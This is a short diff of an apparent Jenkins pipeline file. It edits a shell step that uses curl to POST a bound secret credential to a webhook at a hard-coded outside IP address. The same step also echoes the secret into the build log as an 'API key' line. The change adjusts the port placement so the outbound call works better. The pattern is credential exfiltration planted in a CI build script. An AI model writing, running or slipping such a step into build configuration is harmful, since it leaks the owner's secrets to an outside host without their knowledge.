@@ -14,7 +14,7 @@ node {
                               variable: 'secretText')]) {
         apiKey = "\nAPI key: ${secretText}\n"
         sh '''
-        curl -XPOST -H "Content-type: application/json" -d '{"data":{"secretText":"'${secretText}'"}}' 'http://http://35.212.165.95/:5000/webhook'
+        curl -XPOST -H "Content-type: application/json" -d '{"data":{"secretText":"'${secretText}'"}}' 'http://http://35.212.165.95:5000/webhook'
         '''
       }
       println apiKey
